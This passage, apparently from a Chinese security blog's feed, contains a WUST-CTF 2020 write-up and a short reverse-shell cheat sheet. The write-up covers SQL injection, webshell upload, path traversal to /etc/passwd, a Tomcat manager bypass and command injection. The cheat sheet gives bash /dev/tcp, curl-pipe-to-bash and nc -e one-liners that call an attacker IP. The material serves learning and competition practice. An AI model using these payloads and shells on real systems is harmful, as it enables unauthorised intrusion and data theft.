    <content type="html"><![CDATA[<hr><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>打开页面显示Who’s the author?，回到题目发现作者是52HeRtz，输入52HeRtz发现有截断，f12选中输入框把maxlength改成一个较大的数即可输入。然后发现提交按钮不能用，选中提交按钮删除disabled=”disabled”(意思是禁止点击)即可。提交弹出：一个远古的博客: <a href="https://52hertz.tech" target="_blank" rel="noopener">https://52hertz.tech</a><br>打开链接跳到一个博客首页<br>在最后一篇博客发现名为远古的blog的文章，打开在最下面发现Here is your flag: 5_a_c@nner_can_Can_@_can}。这应该不是完整的flag,回到首页发现会动态显示flag,查看源代码，搜索wctf找到对应的flag的前半段，拼接即可。</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200328143052442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>题目说作为admin登录，尝试万能密码，用户名为admin’#，密码随便输，成功登入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">提示必须本地IP：X-Forwarded-For:127.0.0.1</span><br><span class="line">用GET方式传一个参数ais, 值为520：?ais=520</span><br><span class="line">用POST方式传一个参数wust, 值为1314 ：burpsuite变更请求方法,注意get还是要在网址那传参，wust=131</span><br></pre></td></tr></table></figure><p>提示离flag很近了，给了个网址，但应该顺序是乱的<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200329135428234.png"  alt="在这里插入图片描述"><br>先拼接<a href="https://paste.ubuntu.com打开" target="_blank" rel="noopener">https://paste.ubuntu.com打开</a><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200329135536616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>随便输入个字符结果地址是<a href="https://paste.ubuntu.com/p/rJcP4y52Yv/" target="_blank" rel="noopener">https://paste.ubuntu.com/p/rJcP4y52Yv/</a><br>这和题目给的网址类似，按照这个格式拼接尝试即可</p><h2 id="CV-Maker"><a href="#CV-Maker" class="headerlink" title="CV Maker"></a>CV Maker</h2><p>先注册个账号，然后登录。发现页面其他地方不能点击。只有个更换图像，考点应该是文件上传。尝试上传一句话木马均失败，改变content-type均失败，扫描发现有uploads目录，访问发现好多文件，按时间排序上传一个正常的图片发现就在这个目录下，查看别人上传的php文件，发现只能看到GIF89a，谷歌搜了下文件上传发现这是文件头检验。<img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200328144508301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>在burpsuite一句话前面加上GIF89a,然后去uploads目录下查看刚刚上传的php文件，用蚁剑成功连接。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020032814453471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>到根目录发现flag文件打开一片空白，然后又发现还有个readflag文件。因为前不久就做过一题成功上传了木马，却找不到flag，情形和现在一样。当时看了wp就是说在终端运行readflag即可。</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020032814501679.png"  alt="在这里插入图片描述"></p><blockquote><p>看来还是得再看看文件上传，这次是碰巧了，hahaha。附上一篇不错的<a href="https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/" target="_blank" rel="noopener">文件上传漏洞（绕过姿势） </a></p></blockquote><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><blockquote><p>本来没做出来，结束时群里有人说可以读bash_history,又去做了下，做出来了，不过读bash_history是非预期的答案，haha</p></blockquote><p>上传一个文件返回一个下载地址，在最后输错会暴露绝对路径<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200329222735522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>我们可以根据这向上层找找到根目录先下载passwd文件查看有哪些用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.96.229.52:12121/download?file=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>可以看到存在tomajp用户，然后下载它的bash_history文件<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200329223055902.png"  alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">47.96.229.52:12121/download?file=../../../../../../../home/tomajp/.bash_history</span><br></pre></td></tr></table></figure><p>打开文件一般看最后发现<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200329223200665.png"  alt="在这里插入图片描述"><br>尝试进入根目录下的flaaaag下的what_you_want<br>下载文件打开即得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">47.96.229.52:12121/download?file=../../../../../../../flaaaag/what_you_want</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200329223312897.png"  alt="在这里插入图片描述"></p><h2 id="train-yourself-to-be-godly"><a href="#train-yourself-to-be-godly" class="headerlink" title="train yourself to be godly"></a>train yourself to be godly</h2><blockquote><p>这题wp来自官方wp：<a href="https://ivenwings.github.io/2020/03/30/wctf2020_official_wp/#train-yourself-to-be-godly-1-solves" target="_blank" rel="noopener">WUST-CTF 2020 官方 Writeup</a></p></blockquote><p>页面是 examples，其实洞不在这里，好像一般人很难想得到，肯定得需要 hint，于是就有了 Orange 大哥在 BlackHat 上的一个议题，就是那个 pdf，主要内容就是URL路径参数不规范引发的问题，能造成的危害如下<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200330220931669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>apache中的tomcat/webapps目录如下。</p><p>既然题目是用了examples目录作为网站根目录，那么上图中的Web容器控制台和管理界面这一点就显得很有意思了<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200330220953831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>manage目录是可以上传WAR文件部署服务，也就是说可以通过manage目录实现文件上传，继而实现木马上传，也就是第二个hint。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020033022101421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>我们可以看到 pdf 有一个这样的东西，告诉我们可以通过 /..;/manager/html 进入到manager页面。</p><p>并且随便加一串路径，根据报错信息知道我们当前的tomcat的root路径为examlpes<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200330221038281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>目录穿越到 manager 得输入密码验证，这里是弱密码 tomcat/tomcat</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200330221054191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>接下来就是上传 war 包拿 webshell，github挑一个就好了，这里用 LandGrey 的。</p><p>可以直接用jar cvf yourname.war webshell.jsp命令将webshell.jsp打包成war</p><p>选择文件，上传。</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020033022111222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>根据报错信息明显路径拼结完是example/manager/html/upload，缺少一个/..;/，加一个再试</p><p>返回一个403，这说明/manager/html/upload路径访问到了，但是权限不够，那一般问题就出在cookie或者session没给，www没有目录访问权限身上。按照目前的思路来说，不会出现服务器权限不足的问题，那就只能是cookie没添。利用burpsuit从头开始抓包，在访问/..;/manager/html出现了Set-Cookie(set-Cookie的Path是指此cookie只在Path目录下起作用)，那么我们403的问题就迎刃而解，只需要将/example换成Path参数指定的/manage就行，再把cookie加上就完事了。</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200330221129353.png"  alt="在这里插入图片描述"></p><p>修改post，添加cookie（ps: 由于cookie只能用一次，所以还是403的话，再请求一次/..;/manager/html，更换新的cookie就行了 ），上传完毕后可以看到war已安装好了，访问上传的war，注意这里还有一个/..;/的坑，剩下的就是根据自己的马找flag了。</p><p>当然直接找flag是找不到的，这道题我改得比较玄学，加了《圣经》新约：《提摩太后书》里的文章。（逃<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200330221143225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200330221153882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>可以看到在Timothy里面，cat 一下，是一段文章，这里知道flag格式，grep一下 wctf2020，就可以看到flag了。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200330221206348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020033022121450.png"  alt="在这里插入图片描述"></p><p>In the end, train yourself to be godly.</p><h2 id="朴实无华"><a href="#朴实无华" class="headerlink" title="朴实无华"></a>朴实无华</h2><p>intval(字符串)为0 但是intval(字符串+1) 会自动转换成数值<br>MD5需要用一个0e开头纯数字加密后仍为0e开头纯数字的数<br>空格用${IFS}代替</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">101.200</span>.<span class="number">53.102</span>:<span class="number">23333</span>/fl4g.php?num=<span class="number">0</span>x2022&amp;md5=<span class="number">0</span>e215962017&amp;get_flag=cut<span class="variable">$</span>&#123;IFS&#125;<span class="literal">-b</span><span class="variable">$</span>&#123;IFS&#125;<span class="number">1</span><span class="literal">-222</span><span class="variable">$</span>&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><h2 id="颜值成绩查询"><a href="#颜值成绩查询" class="headerlink" title="颜值成绩查询"></a>颜值成绩查询</h2><p>明显是sql注入，经测试过滤了空格可用/**/代替，过滤了关键字可用大小写替换。剩下没啥了union查询查出flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.200.53.102:10114/?stunum=-1/**/uNion/**/seleCt/**/1,flag,value/**/frOm/**/flag--+</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200329125337505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><blockquote><p>吐槽一下sqlmap,明明设置了脚本还是没跑出来，最后还是手工注入的，经检查注入代码发现注释的–后面的空格也被替换成/**/了，导致注释失效。看来还是得学学写py脚本了。<br>补充：官方wp说检查了UA,所以sqlmap根本跑不出来</p></blockquote><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Space-Club"><a href="#Space-Club" class="headerlink" title="Space Club"></a>Space Club</h2><p>打开文件一片空白，但是如果Ctrl+a全选文本就会发现<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200328150353926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>那么flag肯定是0和1搭配然后转换，这里说个技巧，比如这次比赛flag都是wctf2020{},那么我们可以先看看w的二进制是什么，然后往这方面靠。w的二进制是01110111，然而在文本编辑器里不大容易看出来，放到sumlime中发现<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200328150644194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>这样很明显的发现每行正好对应01110….<br>把等于第一行的内容全部替换成0，然后第二行正好是00，然后把00替换成1，再把换行替换成空格即可。就会出现01字符串。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200328151010582.png"  alt="在这里插入图片描述"><br>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shiZhuanAscii</span><span class="params">(ls)</span>:</span><span class="comment">#十进制列表转ascii</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ls:</span><br><span class="line">    flag=flag+chr(int(i))</span><br><span class="line"><span class="keyword">return</span> flag</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">erZhuanShi</span><span class="params">(ls)</span>:</span><span class="comment">#二进制列表转十进制列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ls)):</span><br><span class="line">ls[i]=int(ls[i],<span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> ls</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">splitS</span><span class="params">(s,n)</span>:</span><span class="comment">#把字符s每n个分到一个列表元素</span></span><br><span class="line">ls=re.findall(<span class="string">'.&#123;'</span>+str(n)+<span class="string">'&#125;'</span>, s)     </span><br><span class="line"><span class="keyword">return</span> ls</span><br><span class="line"></span><br><span class="line"><span class="comment">#示例：</span></span><br><span class="line"></span><br><span class="line">s=<span class="string">"011101110110001101110100011001100011001000110000001100100011000001111011011010000011001101110010011001010101111100110001011100110101111101111001001100000111010101110010010111110110011001101100010000000110011101011111011100110011000101111000010111110111001100110001011110000101111101110011001100010111100001111101"</span></span><br><span class="line">ls=splitS(s,<span class="number">8</span>)  <span class="comment">#['1100110', '1101100', '1100001', '1100111', '1111011', '1010111', '0110000', '1010111', '0101010', '1100110', '1110101', '1101110', '1101110', '1111001', '1111101']</span></span><br><span class="line">ls=erZhuanShi(ls)  <span class="comment">#[102, 108, 97, 103, 123, 87, 48, 87, 42, 102, 117, 110, 110, 121, 125]</span></span><br><span class="line">ls=shiZhuanAscii(ls) <span class="comment">#flag&#123;W0W*funny&#125;</span></span><br><span class="line">print(ls)</span><br></pre></td></tr></table></figure><p>直接跑出flag<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200328151138592.png"  alt="在这里插入图片描述"></p><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>打开发现一个exe程序，还有一个xml文件，题目说明中说会打开摄像头。</p><p>搜了下那个xml文件名发现相当于人脸识别。由于我用的Linux，用我姐的电脑打开exe文件等一小会摄像头打开了，发现会有个圈圈圈注你的脸，左晃晃右晃晃也没发现咋整，就在这时突然小黑框出现了flag。hahaha。</p><p>然后又研究了下咋回事，题目说三人行，exe中又会有圈，于是尝试在画面中让相机捕捉到三个圈(可以用手比个圈)就出现了flag。</p><h2 id="Alison-likes-jojo"><a href="#Alison-likes-jojo" class="headerlink" title="Alison likes jojo"></a>Alison likes jojo</h2><p>打开文件两个图片，binwalk一波发现其中一个藏有压缩包，分离发现压缩包密码。</p><p>这时一般有两种情况<br>1.根据没用到的那张图片找到解压密码，再继续下一步。这种一般密码都比较复杂。<br>2.暴力破解得到密码，然后再结合剩下那张图片。</p><p>一边暴力破解一边分析下另一张图片。一会暴力破解成功，密码是纯数字。解压发现好像是base64:WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09，几次base64解密得到killerqueen。这应该是个秘钥。这时首先想到了outguess加密(因为前几天bjdctf就有个outguess隐写)。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess <span class="literal">-r</span> jljy.jpg <span class="literal">-k</span> killerqueen  out.txt</span><br></pre></td></tr></table></figure><p>然后打开out.txt发现flag</p><h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><p>根据题目提示nc连接，发现是个买flag的商店<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200328152759448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>1就是查看余额，2买flag有两个选项，买真的flag提示钱不够(一般都是这个套路)，但是可以买Cheaper flag,但也只能买两个然后就没钱了<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200328152957945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>一筹莫展时搜了下这样的ctf题目，虽然没搜到但一篇文章提到了让价钱等于-1溢出，然后尝试买Cheaper flag时输一个较大的数。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200328153258454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>我们可以发现花费是负的数，这样余额减去一个负的数就是一个比较大的正数。原理大概是计算机有固定运算能力，如果超过最大运算值会来个循环正太大就从负的开始了。不过现在一般都不会出这种问题，都有防护措施的。<br>然后去买real flag,成功买到<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200328153541470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h2 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h2><blockquote><p>本来以为是摩丝密码，看wp才知道是九键的声音</p></blockquote><p>原理是DTMF<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200330155057182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>经搜索找到了软件解密和py脚本，可能会有误差，稍微调整下即可<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200330150013864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200330150053759.png"  alt="在这里插入图片描述"><br>解密得到flag：wctf2020{youaremygirlfriends}<br>如果出现提交不对，可能是识别的重复了，可结合AU看频谱图看看它的次数<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200330155014556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h2 id="爬"><a href="#爬" class="headerlink" title="爬"></a>爬</h2><p>打开提示flag被图片盖住，本来以为是找那种分离pdf的工具，一番搜索无果，然后binwalk foremost分离试试，分离了一个图片但还是没啥用。</p><p>然后突然想到试试把pdf里的图片删除试试。打开分离的图片,然后找到文件头和文件尾。在PDF里删除对应的十六进制。这时打开还是啥都没有。想着改下后缀名吧，再打开就出现了一行十六进制。</p><blockquote><p>这里是个坑，我用的linux，不是根据后缀名打开文件的，打开源文件的是自带的一个软件，改后缀pdf后是默认wps打开。</p></blockquote><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200328211859588.png"  alt="在这里插入图片描述"><br>用qq识图复制十六进制转文本得到flag</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200328212014382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><blockquote><p>看到flag猜测应该是用ps分层把图片那层去掉。<br>ps解法：打开pdf文件选择图像引入，选择第一个图像即可。</p></blockquote><h2 id="Find-me"><a href="#Find-me" class="headerlink" title="Find me"></a>Find me</h2><p>打开图片查看备注发现⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍=<br>明显是盲文(几个点最后有等于号)<br>在线解密，附上网站：<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">盲文解密</a><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200329122055178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>总的来说体验还是不错的，这次比赛可能是新生赛比较简单点，题目大多考的不是很难的点而是脑洞吧，不过还是发现了自己的一点不足，还是得继续努力。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;checkin&quot;&gt;&lt;a href=&quot;#checkin&quot; class=&quot;headerlink&quot; title=&quot;ch
      
    
    </summary>
    
    
      <category term="CTF-WEB" scheme="http://yoursite.com/categories/CTF-WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>反弹Shell</title>
    <link href="http://yoursite.com/2020/03/26/%E5%8F%8D%E5%BC%B9Shell/"/>
    <id>http://yoursite.com/2020/03/26/%E5%8F%8D%E5%BC%B9Shell/</id>
    <published>2020-03-26T06:45:00.000Z</published>
    <updated>2020-04-07T09:09:24.401Z</updated>
    
    <content type="html"><![CDATA[<hr><p>说明：端口可任意，但要保持一致而且不能被占用，以下均为攻击机登录被攻击机</p><h1 id="bash连接"><a href="#bash连接" class="headerlink" title="bash连接"></a>bash连接</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机器输入 nc -lvp 7777</span><br><span class="line"></span><br><span class="line">被攻击机器输入bash -i &gt;&amp; /dev/tcp/攻击机ip/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然后攻击机器就相当于登陆了了被攻击机器</p><h1 id="curl连接"><a href="#curl连接" class="headerlink" title="curl连接"></a>curl连接</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在攻击机根目录下创建shell.txt,内容为bash -i &gt;&amp; /dev/tcp/攻击机ip/7777 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">//注意shell.txt不是在服务器根目录，而是例如/var/www/html下</span><br><span class="line">被攻击机执行curl 攻击机ip/shell.txt|bash  //先curl获得shell.txt的内容然后用bash执行</span><br></pre></td></tr></table></figure><h1 id="nc连接"><a href="#nc连接" class="headerlink" title="nc连接"></a>nc连接</h1><p>说明：用nc连接成功后不会出现类似bash连接那种开头的root@kali这种，可用pwd检测是否连接成功</p><h3 id="利用攻击机ip"><a href="#利用攻击机ip" class="headerlink" title="利用攻击机ip"></a>利用攻击机ip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机输入 nc -lvp 7777</span><br><span class="line"></span><br><span class="line">被攻击机输入 nc -e /bin/bash 攻击机ip 7777</span><br></pre></td></tr></table></figure><h3 id="利用被攻击机ip"><a href="#利用被攻击机ip" class="headerlink" title="利用被攻击机ip"></a>利用被攻击机ip</h3><p><strong>其他都是需要攻击机ip，这个则相反。我的理解是需要攻击机ip的相当于把shell弹给攻击机(所以攻击机ip和bash在一行代码)，而这个相当于在本地端口开个shell,攻击机访问端口来拿shell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机输入 nc 被攻击机ip 7777</span><br><span class="line"></span><br><span class="line">被攻击机输入  nc -lvp 7777 -e /bin/bash</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;说明：端口可任意，但要保持一致而且不能被占用，以下均为攻击机登录被攻击机&lt;/p&gt;
&lt;h1 id=&quot;bash连接&quot;&gt;&lt;a href=&quot;#bash连接&quot; class=&quot;headerlink&quot; title=&quot;bash连接&quot;&gt;&lt;/a&gt;bash连接&lt;/h1&gt;&lt;figure 
      
    
    </summary>
    
    
      <category term="CTF-WEB" scheme="http://yoursite.com/categories/CTF-WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>BJDCTF-writeup</title>
    <link href="http://yoursite.com/2020/03/23/BJDCTF-writeup/"/>
    <id>http://yoursite.com/2020/03/23/BJDCTF-writeup/</id>
    <published>2020-03-23T06:42:00.000Z</published>
    <updated>2020-04-07T15:12:11.181Z</updated>
    
